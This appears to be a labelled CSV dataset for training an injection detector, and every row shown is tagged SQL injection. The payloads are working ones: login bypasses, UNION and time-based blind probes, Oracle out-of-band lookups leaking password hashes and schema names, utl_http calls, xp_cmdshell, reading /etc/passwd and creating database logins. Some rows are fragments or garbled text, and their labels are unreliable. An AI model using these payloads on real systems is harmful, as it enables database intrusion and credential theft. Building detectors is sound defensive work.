Sentence,SQLInjection,XSS,Normal
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1,0,0
admin' or ',1,0,0
" select * from users where id = '1' union select  ( \ ) ,@@VERSION -- 1'",1,0,0
1'1,1,0,0
1 and user_name (  )   =  'dbo',1,0,0
"'; if not ( substring  (  (  select @@version ) ,24,1 )  <> 1 )  waitfor delay '0:0:2' --",1,0,0
" select * from users where id = 1 or 1#""$ union select 1,version (  )  -- 1",1,0,0
" select * from users where id = 1 or 1#""{ union select null,version (  )  -- 1",1,0,0
 select * from users where id = '1' *$ . or 1 = 1 -- 1',1,0,0
 select * from users where id = 1 +$+. or 1 = 1 -- 1,1,0,0
 select * from users where id = 1 or  ( \+ )  = 1 or 1 = 1 -- 1,1,0,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1,0,0
 or 1 = 1 or '' = ',1,0,0
 select * from users where id = 1   or 1 = 1 -- 1,1,0,0
 or 'text' > 't',1,0,0
"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,0,0
" select * from users where id = 1 or ""%["" or 1 = 1 -- 1",1,0,0
"admin"" --",1,0,0
" select * from users where id = 1 or 1#""; = 1 union select 1,version (  )  -- 1",1,0,0
admin' or '1' = '1'#,1,0,0
 select * from users where id = 1 +$ 1 or 1 = 1 -- 1,1,0,0
s,1,0,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1,0,0
' select * from information_schema.tables--,1,0,0
" select * from users where id = 1 or ""$&"" or 1 = 1 -- 1",1,0,0
1  )  )   or pg_sleep ( __TIME__ ) --,1,0,0
" select * from users where id = '1' union select !<@,version (  )  -- 1'",1,0,0
declare @q nvarchar  ( 200 )  select @q  =  0x770061 ...,1,0,0
' or 1 = 1 or '' = ',1,0,0
 select * from users where id = 1 %!<1 or 1 = 1 -- 1,1,0,0
declare @q nvarchar  ( 200 )  select @q  =  0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec ( @q ) ,1,0,0
&,1,0,0
1\'1,1,0,0
" select * from users where id = 1 or ""]1"" or 1 = 1 -- 1",1,0,0
%2A%28%7C%28objectclass%3D%2A%29%29,1,0,0
" select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1",1,0,0
 or 'unusual'  =  'unusual',1,0,0
' or 1 in  ( select @@version ) --,1,0,0
truncate,1,0,0
as,1,0,0
 or 3 = 3 --,1,0,0
" select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1",1,0,0
" select * from users where id = 1 <@$$ union select 1,version (  )  -- 1",1,0,0
"admin"" )  or  ( ""1"" = ""1",1,0,0
" select * from users where id = 1 or 1#""@ union select 'a',version (  )  -- 1",1,0,0
"1 )  or benchmark ( 10000000,MD5 ( 1  )  )  #",1,0,0
" select * from users where id = 1 union select .1_,version (  )  -- 1",1,0,0
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.DATABASE_NAME FROM DUAL  )  )   AND 'i' = 'i,1,0,0
" or 0 = 0 #""",1,0,0
 select * from users where id = 1 %$ 1 or 1 = 1 -- 1,1,0,0
 select * from users where id = 1 %!<@ or 1 = 1 -- 1,1,0,0
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 0 )  waitfor delay '0:0:2' --",1,0,0
1 )  or sleep ( __TIME__ ) #,1,0,0
" select * from users where id = 1 or ""1_"" or 1 = 1 -- 1",1,0,0
" select * from users where id = 1 <1## union select 1,version (  )  -- 1",1,0,0
" select * from users where id = 1 + $+*\ union select null,@@VERSION -- 1",1,0,0
29%,1,0,0
 select * from users where id = 1. <@ or 1 = 1 -- 1,1,0,0
' or true--,1,0,0
'; execute immediate 'sel' || 'ect us' || 'er',1,0,0
'hi' or 'x' = 'x';,1,0,0
 select * from users where id = 1 <@ or 1 = 1 -- 1,1,0,0
" select * from users where id = 1 or "".,"" or 1 = 1 -- 1",1,0,0
admin' #,1,0,0
" select * from users where id = 1 <@$_ union select 1,version (  )  -- 1",1,0,0
" select * from users where id = 1 or "", ( "" or 1 = 1 -- 1",1,0,0
" select * from users where id = 1 or "",{"" or 1 = 1 -- 1",1,0,0
" union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",1,0,0
""" ) ;waitfor delay '0:0:__TIME__'--",1,0,0
' or 'unusual'  =  'unusual',1,0,0
"insert into mysql.user  ( user, host, password )  values  ( 'name', 'localhost', password ( 'pass123'  )  )  ",1,0,0
"admin"" or ""1"" = ""1""/*",1,0,0
" select * from users where id = 1 or ""1 ( "" = 1 or 1 = 1 -- 1",1,0,0
" select * from users where id = 1 or \<1 union select 1,@@VERSION -- 1",1,0,0
like,1,0,0
; execute immediate 'sel' || 'ect us' || 'er',1,0,0
 or username like char ( 37 ) ;,1,0,0
  )  )   or pg_sleep ( __TIME__ ) --,1,0,0
 select * from users where id = 1 or $+<\ or 1 = 1 -- 1,1,0,0
 or 3 = 3,1,0,0
" select * from users where id = 1 or "" ( ."" or 1 = 1 -- 1",1,0,0
%7C,1,0,0
 select * from users where id = 1 or  ( $+ )  = 1 or 1 = 1 -- 1,1,0,0
0x77616974666F722064656C61792027303A303A313027 ...,1,0,0
exec sp,1,0,0
" select * from users where id = 1 or \+<$ union select 1,@@VERSION -- 1",1,0,0
 select * from users where id = 1 or \<$ or 1 = 1 -- 1,1,0,0
{s,1,0,0
3.10E+17,1,0,0
" select * from users where id = 1.&&1 union select 1,version (  )  -- 1",1,0,0
admin' or 1 = 1/*,1,0,0
a' waitfor delay '0:0:10'--,1,0,0
" select * from users where id = 1 + ( \ )  union select null,@@VERSION -- 1",1,0,0
&1c,1,0,0
""" """,1,0,0
 or 'x' = 'x,1,0,0
" select * from users where id = 1 union select .1$_,version (  )  -- 1",1,0,0
 and 1 in  ( select var from temp ) --,1,0,0
hi' )  or  ( 'a' = 'a,1,0,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1,0,0
"admin"" or 1 = 1",1,0,0
""" )  or true--",1,0,0
" select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'",1,0,0
1,1,0,0
" select * from users where id = 1 or "" ( {"" or 1 = 1 -- 1",1,0,0
tz_offset,1,0,0
1 )  or pg_sleep ( __TIME__ ) --,1,0,0
" select * from users where id = 1 or ""{."" or 1 = 1 -- 1",1,0,0
""" )  or sleep ( __TIME__ )  = """,1,0,0
 select * from users where id = 1.<@. or 1 = 1 -- 1,1,0,0
"admin"" )  or  ( ""1"" = ""1""--",1,0,0
//,1,0,0
" select * from users where id = 1<@.. union select 1,version (  )  -- 1",1,0,0
' or 'whatever' in  ( 'whatever' ) ,1,0,0
 or 1 = 1--,1,0,0
; exec xp_regread,1,0,0
" select * from users where id = '1' + @ 1 union select 1,version (  )  -- 1'",1,0,0
 select * from users where id = 1 + \+%1 or 1 = 1 -- 1,1,0,0
" select * from users where id = 1 or "";1"" or 1 = 1 -- 1",1,0,0
" select * from users where id = 1 or ""%&"" or 1 = 1 -- 1",1,0,0
1 and 1 = 1,1,0,0
;s,1,0,0
 or 0 = 0 #,1,0,0
 union select * from users where login  =  char ...,1,0,0
" select * from users where id = 1 union select 1||@,version (  )  -- 1",1,0,0
admin' )  or '1' = '1'--,1,0,0
1;SELECT *,1,0,0
" select * from users where id = 1 or ""{;"" or 1 = 1 -- 1",1,0,0
x' and 1 =  ( select count ( * )  from tabname ) ; --,1,0,0
" select * from users where id = '1' or """"<@ union select 1,version (  )  -- 1'",1,0,0
" select * from users where id = 1 or ""?,"" or 1 = 1 -- 1",1,0,0
" select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'",1,0,0
"1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1,0,0
 ( s,1,0,0
procedure,1,0,0
 or '' = ',1,0,0
or 0 = 0 #,1,0,0
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.LOGIN_USER FROM DUAL  )  )   AND 'i' = 'i,1,0,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1,0,0
\'; desc users; --,1,0,0
" select * from users where id = 1 or  ( \. )  = 1 union select 1,@@VERSION -- 1",1,0,0
 select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1',1,0,0
""" or """"^""",1,0,0
"""-""",1,0,0
" select * from users where id = 1 or \<  = 1 union select 1,@@VERSION -- 1",1,0,0
" select * from users where id = 1 union select 1<@$,version (  )  -- 1",1,0,0
" select * from users where id = 1 *\ union select null,@@VERSION -- 1",1,0,0
" select * from users where id = '1' or !<@ union select 1,version (  )  -- 1'",1,0,0
" select * from users where id = 1 or "".%"" or 1 = 1 -- 1",1,0,0
admin'/*,1,0,0
" select * from users where id = 1 or "" ( #"" or 1 = 1 -- 1",1,0,0
'||UTL_HTTP.REQUEST,1,0,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1,0,0
" select * from users where id = '1'<@.. union select 1,version (  )  -- 1'",1,0,0
"""  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #",1,0,0
" select * from users where id = 1 <@.$ union select 1,version (  )  -- 1",1,0,0
" select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1",1,0,0
 select * from users where id = '1' <@.$ or 1 = 1 -- 1',1,0,0
1 uni/**/on select all from where,1,0,0
" select * from users where id = 1 +$ . union select null,@@VERSION -- 1",1,0,0
" select * from users where id = 1 or 1#""? union select null,version (  )  -- 1",1,0,0
admin' )  or '1' = '1'#,1,0,0
'||utl_http.request ( 'httP://192.168.1.1/' ) ||',1,0,0
 or '7659' = '7659,1,0,0
" select * from users where id = 1 or ""{@"" or 1 = 1 -- 1",1,0,0
n,1,0,0
" select * from users where id = 1 union select +!<1,version (  )  -- 1",1,0,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1,0,0
" select * from users where id = 1 or "" ( @"" or 1 = 1 -- 1",1,0,0
or true--,1,0,0
" select * from users where id = 1 union select !<1,version (  )  -- 1",1,0,0
" select * from users where id = '1' union select \#,@@VERSION -- 1'",1,0,0
" select * from users where id = 1 or 1#""{ union select 1,version (  )  -- 1",1,0,0
""" or true--",1,0,0
 select * from users where id = 1. or 1 = 1 -- 1,1,0,0
" select * from users where id = 1 or @#"", = 1 union select 1,version (  )  -- 1",1,0,0
" select * from users where id = 1 or "";@"" or 1 = 1 -- 1",1,0,0
Ã¢Â€Â˜ or 3 = 3 --,1,0,0
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT global_name FROM global_name  )  )   AND 'i' = 'i,1,0,0
" select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1",1,0,0
" select * from users where id = 1 or "",,"" = 1 or 1 = 1 -- 1",1,0,0
" select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1",1,0,0
" select * from users where id = 1 or 1#""? union select version (  ) ,version (  )  -- 1",1,0,0
" select * from users where id = 1 or "" ) 1"" or 1 = 1 -- 1",1,0,0
' or uid like '%,1,0,0
 select * from users where id = '1' <@&1 or 1 = 1 -- 1',1,0,0
 ) s,1,0,0
" select * from users where id = '1' union select !<1,version (  )  -- 1'",1,0,0
'; exec xp_regread,1,0,0
23 or 1 = 1; --,1,0,0
" select * from users where id = 1 or \<\. union select 1,@@VERSION -- 1",1,0,0
" select * from users where id = 1 or ""{ ( "" = 1 or 1 = 1 -- 1",1,0,0
" select * from users where id = 1 or ""%_"" or 1 = 1 -- 1",1,0,0
 select * from users where id = 1 +  ( \. )  or 1 = 1 -- 1,1,0,0
" select * from users where id = '1' union select \,@@VERSION -- 1'",1,0,0
0 or 1 = 1,1,0,0
 select * from users where id = 1 &@ or 1 = 1 -- 1,1,0,0
"admin"" )  or ""1"" = ""1",1,0,0
 select * from users where id = 1 or \<  = 1 or 1 = 1 -- 1,1,0,0
" select * from users where id = 1 or ""??"" or 1 = 1 -- 1",1,0,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1,0,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1,0,0
&apos; OR,1,0,0
sqlvuln;,1,0,0
 select * from users where id = 1 + $+%$ or 1 = 1 -- 1,1,0,0
UEs,1,0,0
 select * from users where id = '1' + $+%\ or 1 = 1 -- 1',1,0,0
""" or """"*""",1,0,0
"hi or 1 = 1 --""",1,0,0
" select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1",1,0,0
'; exec master..xp_cmdshell 'ping 172.10.1.255'--,1,0,0
" select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'",1,0,0
" select * from users where id = '1' union select ""?""_,version (  )  -- 1'",1,0,0
||UTL_HTTP.REQUEST,1,0,0
 select * from information_schema.tables--,1,0,0
 select * from users where id = 1 or \<\. or 1 = 1 -- 1,1,0,0
'  ( select top 1,1,0,0
ÃƒÂ½ or 1 = 1 --,1,0,0
a' --,1,0,0
' or 1 = 1 /*,1,0,0
" select * from users where id = 1 or 1#"", union select null,version (  )  -- 1",1,0,0
" select * from users where id = '1' union select $ .,@@VERSION -- 1'",1,0,0
 --,1,0,0
"exec sp_addlogin 'name' , 'password'",1,0,0
?s,1,0,0
" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1",1,0,0
0x77616974666F722064656C61792027303A303A31302700 exec ( @s ) ,1,0,0
',1,0,0
" select * from users where id = 1 or "". ) "" or 1 = 1 -- 1",1,0,0
" select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1",1,0,0
 group by userid having 1 = 1--,1,0,0
" select * from users where id = 1 + \+%1 union select null,@@VERSION -- 1",1,0,0
 select * from users where id = 1 *1 or 1 = 1 -- 1,1,0,0
" select * from users where id = 1 or @#""; = 1 or 1 = 1 -- 1",1,0,0
â€˜ or 1 = 1 --,1,0,0
" select * from users where id = 1 *\. union select null,@@VERSION -- 1",1,0,0
 select * from users where id = 1 % ( @ )  or 1 = 1 -- 1,1,0,0
 or 'a' = 'a,1,0,0
declare @s varchar ( 22 )  select @s  = ,1,0,0
" select * from users where id = 1 union select 1<@,version (  )  -- 1",1,0,0
" select * from users where id = 1 + \+*\ union select null,@@VERSION -- 1",1,0,0
" select * from users where id = 1 or 1#"". union select version (  ) ,version (  )  -- 1",1,0,0
@variable,1,0,0
; exec master..xp_cmdshell,1,0,0
21%,1,0,0
 select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1,1,0,0
" select * from users where id = 1 union select @ 1$,version (  )  -- 1",1,0,0
" select * from users where id = 1 union select @ 1a,version (  )  -- 1",1,0,0
" select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1",1,0,0
" select * from users where id = '1' or  ( \. )  = 1 union select 1,@@VERSION -- 1'",1,0,0
' and 1 in  ( select var from temp ) --,1,0,0
" select * from users where id = '1' union select 1""!"",banner from v$version where rownum = 1 -- 1'",1,0,0
" select * from users where id = 1 or ""1]"" or 1 = 1 -- 1",1,0,0
" select * from users where id = 1 or ""$?"" or 1 = 1 -- 1",1,0,0
 or x = x,1,0,0
or a = a,1,0,0
 or '1' = '1,1,0,0
" select * from users where id = 11<1# union select 1,version (  )  -- 1",1,0,0
'  )  )   or   (  (  'x'  )  )   =   (  (  'x,1,0,0
" select * from users where id = '1' or \.<1 union select 1,@@VERSION -- 1'",1,0,0
" select * from users where id = '1' <@&1 union select 1,version (  )  -- 1'",1,0,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1,0,0
'; if is_srvrolemember ( 'sysadmin' )  > 0 waitfor delay '0:0:2' -- ,1,0,0
 select * from users where id = 1 <@<@ or 1 = 1 -- 1,1,0,0
" select * from users where id = 1 union select @<@$,version (  )  -- 1",1,0,0
" select * from users where id = '1' <@<@ union select 1,version (  )  -- 1'",1,0,0
" select * from users where id = 1 or ""$_"" or 1 = 1 -- 1",1,0,0
" select * from users where id = 1 or 1#""{ union select version (  ) ,version (  )  -- 1",1,0,0
a' or 1 = 1--,1,0,0
 )  or  ( a = a,1,0,0
21%,1,0,0
"""  )  )   or   (  (  ""x""  )  )   =   (  (  ""x",1,0,0
" select * from users where id = 1 or 1#""; or 1 = 1 -- 1",1,0,0
" select * from users where id = '1' <@$_ union select 1,version (  )  -- 1'",1,0,0
 -- &password = ,1,0,0
 select * from users where id = 1 <@. or 1 = 1 -- 1,1,0,0
" select * from users where id = 1 or "" (  ) "" or 1 = 1 -- 1",1,0,0
" select * from users where id = 1 %$ 1 union select null,@@VERSION -- 1",1,0,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1,0,0
' or '1' = '1,1,0,0
admin' or 1 = 1,1,0,0
" select * from users where id = 1 or "";,"" = 1 or 1 = 1 -- 1",1,0,0
" select * from users where id = 1 union select @||1,version (  )  -- 1",1,0,0
" select * from users where id = 1 +\+. union select null,@@VERSION -- 1",1,0,0
" select * from users where id = 1 or "" ) ,"" or 1 = 1 -- 1",1,0,0
"' union select * from users where login  =  char ( 114,111,111,116 ) ;",1,0,0
" select * from users where id = 1 or 1#""? union select 1,version (  )  -- 1",1,0,0
' or 1 = 1--,1,0,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1,0,0
pg_sleep ( __TIME__ ) --,1,0,0
â€˜ or 3 = 3 --,1,0,0
" select * from users where id = 1 -1<@ union select 1,version (  )  -- 1",1,0,0
" select * from users where id = 1 or ""$#"" or 1 = 1 -- 1",1,0,0
 )  union select * from information_schema.tables;,1,0,0
" select * from users where id = 1 or "" ) ]"" or 1 = 1 -- 1",1,0,0
" )  or benchmark ( 10000000,MD5 ( 1  )  )  #",1,0,0
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( column_name  )  )   FROM sys.all_tab_columns  )  )   AND 'i' = 'i,1,0,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1,0,0
""" or """" """,1,0,0
delete,1,0,0
;waitfor delay '0:0:__TIME__'--,1,0,0
 or 1 = 1 --,1,0,0
1' and non_existant_table  =  '1,1,0,0
" select * from users where id = 1 or ""& ) "" or 1 = 1 -- 1",1,0,0
" select * from users where id = '1' + $ . union select 1,@@VERSION -- 1'",1,0,0
declare @s varchar ( 200 )  select @s  =  0x77616974 ...,1,0,0
x' AND userid IS NULL; --,1,0,0
hi' or 'x' = 'x';,1,0,0
" select * from users where id = 1 or "";["" or 1 = 1 -- 1",1,0,0
" select * from users where id = '1' or \.<  = 1 union select 1,@@VERSION -- 1'",1,0,0
" select * from users where id = 1 union select @<@,version (  )  -- 1",1,0,0
" select * from users where id = 1 -@<@ union select 1,version (  )  -- 1",1,0,0
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT host_name FROM v$instance  )  )   AND 'i' = 'i,1,0,0
